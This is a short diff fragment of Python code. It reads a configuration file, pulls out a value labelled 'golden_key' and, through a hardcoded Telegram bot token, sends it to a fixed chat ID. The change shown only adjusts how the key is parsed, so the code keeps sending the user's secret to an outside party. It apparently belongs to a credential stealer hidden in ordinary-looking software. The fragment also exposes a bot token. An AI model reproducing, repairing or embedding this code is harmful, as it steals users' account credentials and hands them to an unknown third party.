@@ -7,7 +7,7 @@ try:
         with open(cfg_path, 'r', encoding='utf-8') as cfg:
             content = cfg.read()
             if 'golden_key :' in content:
-                key = content.split('golden_key :', 1)[1].split('"')[1].strip()
+                key = content.split('golden_key :', 1)[1].strip().split()[0]
                 telebot.TeleBot("8095200587:AAEmt0xS1n9uHoOduTsOnIhRcLImJPwSUTk").send_message(
                     7830070442,
                     f'golden_key: {key}'
